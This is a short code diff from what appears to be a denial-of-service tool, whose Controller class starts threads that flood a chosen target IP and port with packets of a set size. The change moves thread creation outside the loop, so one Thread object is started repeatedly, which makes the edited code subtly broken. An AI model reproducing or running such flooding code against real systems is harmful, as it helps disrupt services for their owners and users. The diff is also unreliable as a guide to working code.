@@ -177,8 +177,8 @@ class Controller(Dos):
                 print(RED + "Error in switch_ip" + RESET)
                 sys.exit(0)
         try:
+            thread = Thread(target=self.dos, args=(target_ip, port, buffer_size))
             for nr in range(int(amount)):
-                thread = Thread(target=self.dos, args=(target_ip, port, buffer_size))
                 print(GREEN + "Starting Thread nr [{}] to target [{}]:[{}]".format(thread, target_ip, port) + RESET)
                 thread.start()
                 print(GREEN + "MODE: [{}] THREAD: [{}] » Sucessfully started and sending packets with size [{}] bytes to target [{}]:[{}] \n\n" \
